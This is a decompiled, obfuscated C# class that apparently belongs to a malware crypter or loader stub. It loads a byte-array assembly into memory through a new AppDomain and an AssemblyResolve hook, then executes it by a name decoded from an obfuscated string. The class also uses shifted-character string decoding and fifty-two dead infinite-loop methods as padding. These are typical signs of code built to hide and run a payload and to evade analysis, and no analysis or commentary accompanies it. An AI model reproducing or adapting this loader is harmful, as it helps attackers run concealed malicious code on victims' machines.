using System;
using System.Reflection;
using System.Reflection.Emit;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

public class GClass6 : MarshalByRefObject
{
	public delegate object GDelegate7(Type i);

	private static object object_0;

	public static Assembly smethod_0(object sender, ResolveEventArgs args)
	{
		return AppDomain.CurrentDomain.Load((byte[])object_0);
	}

	public static bool smethod_1(byte[] byte_0)
	{
		object_0 = byte_0;
		if (smethod_2())
		{
			return true;
		}
		return false;
	}

	private static bool smethod_2()
	{
		Thread thread = new Thread(smethod_4);
		thread.Start();
		return true;
	}

	public static void smethod_3()
	{
		NewLateBinding.LateCall(GForm0.object_2, (Type)null, "Emit", new object[1] { OpCodes.Ldloc_0 }, (string[])null, (Type[])null, (bool[])null, true);
		NewLateBinding.LateCall(GForm0.object_2, (Type)null, "Emit", new object[1] { OpCodes.Ldarg_2 }, (string[])null, (Type[])null, (bool[])null, true);
	}

	public static void smethod_4()
	{
		AppDomain appDomain = AppDomain.CreateDomain("娜维贼353ÿÎぇうYGXJ5せよせね");
		_ = (GClass6)appDomain.CreateInstanceAndUnwrap(typeof(GClass6).Assembly.FullName, typeof(GClass6).FullName);
		byte[] byte_ = (byte[])object_0;
		if (smethod_5(ref byte_))
		{
			AppDomain.Unload(appDomain);
		}
		else
		{
			AppDomain.Unload(appDomain);
		}
	}

	public static bool smethod_5(ref byte[] byte_0)
	{
		AppDomain.CurrentDomain.AssemblyResolve += smethod_0;
		object_0 = byte_0;
		try
		{
			AppDomain.CurrentDomain.ExecuteAssemblyByName(GForm0.smethod_3("--", 2));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		return true;
	}

	public static object wajak(Type s)
	{
		GForm0.GDelegate0 gDelegate = GForm0.smethod_3;
		return s.GetProperty(gDelegate("Irxv}Tsmrx", 4))!.GetGetMethod();
	}

	private void method_0()
	{
		while (true)
		{
		}
	}

	private void method_1()
	{
		while (true)
		{
		}
	}

	private void method_2()
	{
		while (true)
		{
		}
	}

	private void method_3()
	{
		while (true)
		{
		}
	}

	private void method_4()
	{
		while (true)
		{
		}
	}

	private void method_5()
	{
		while (true)
		{
		}
	}

	private void method_6()
	{
		while (true)
		{
		}
	}

	private void method_7()
	{
		while (true)
		{
		}
	}

	private void method_8()
	{
		while (true)
		{
		}
	}

	private void method_9()
	{
		while (true)
		{
		}
	}

	private void method_10()
	{
		while (true)
		{
		}
	}

	private void method_11()
	{
		while (true)
		{
		}
	}

	private void method_12()
	{
		while (true)
		{
		}
	}

	private void method_13()
	{
		while (true)
		{
		}
	}

	private void method_14()
	{
		while (true)
		{
		}
	}

	private void method_15()
	{
		while (true)
		{
		}
	}

	private void method_16()
	{
		while (true)
		{
		}
	}

	private void method_17()
	{
		while (true)
		{
		}
	}

	private void method_18()
	{
		while (true)
		{
		}
	}

	private void method_19()
	{
		while (true)
		{
		}
	}

	private void method_20()
	{
		while (true)
		{
		}
	}

	private void method_21()
	{
		while (true)
		{
		}
	}

	private void method_22()
	{
		while (true)
		{
		}
	}

	private void method_23()
	{
		while (true)
		{
		}
	}

	private void method_24()
	{
		while (true)
		{
		}
	}

	private void method_25()
	{
		while (true)
		{
		}
	}

	private void method_26()
	{
		while (true)
		{
		}
	}

	private void method_27()
	{
		while (true)
		{
		}
	}

	private void method_28()
	{
		while (true)
		{
		}
	}

	private void method_29()
	{
		while (true)
		{
		}
	}

	private void method_30()
	{
		while (true)
		{
		}
	}

	private void method_31()
	{
		while (true)
		{
		}
	}

	private void method_32()
	{
		while (true)
		{
		}
	}

	private void method_33()
	{
		while (true)
		{
		}
	}

	private void method_34()
	{
		while (true)
		{
		}
	}

	private void method_35()
	{
		while (true)
		{
		}
	}

	private void method_36()
	{
		while (true)
		{
		}
	}

	private void method_37()
	{
		while (true)
		{
		}
	}

	private void method_38()
	{
		while (true)
		{
		}
	}

	private void method_39()
	{
		while (true)
		{
		}
	}

	private void method_40()
	{
		while (true)
		{
		}
	}

	private void method_41()
	{
		while (true)
		{
		}
	}

	private void method_42()
	{
		while (true)
		{
		}
	}

	private void method_43()
	{
		while (true)
		{
		}
	}

	private void method_44()
	{
		while (true)
		{
		}
	}

	private void method_45()
	{
		while (true)
		{
		}
	}

	private void method_46()
	{
		while (true)
		{
		}
	}

	private void method_47()
	{
		while (true)
		{
		}
	}

	private void method_48()
	{
		while (true)
		{
		}
	}

	private void method_49()
	{
		while (true)
		{
		}
	}

	private void method_50()
	{
		while (true)
		{
		}
	}

	private void method_51()
	{
		while (true)
		{
		}
	}
}
